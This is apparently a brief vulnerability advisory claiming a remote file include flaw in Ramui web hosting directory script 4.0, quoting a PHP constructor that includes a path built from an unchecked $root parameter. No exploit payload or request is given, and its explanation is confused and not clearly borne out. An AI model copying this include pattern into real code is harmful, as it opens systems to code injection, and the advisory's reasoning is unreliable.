# Title: Ramui web hosting directory script 4.0 Remote File Include Vulnerability

Proof-of-Concept:
/gb/include/connection.php lines 6-13 in php-sourcecode
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
class connection
{
protected $site;
public $error=false;
protected $admin=false;
function __construct($root)
{
        include $root."database/config.php";
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The $root-parameter is a __construct.
But no value was passed to him.
Therefore, nothing can be checked before include in line 13.
So an attacker can execute malicious shellcode about it.
In this case, the __construct is meaningless.
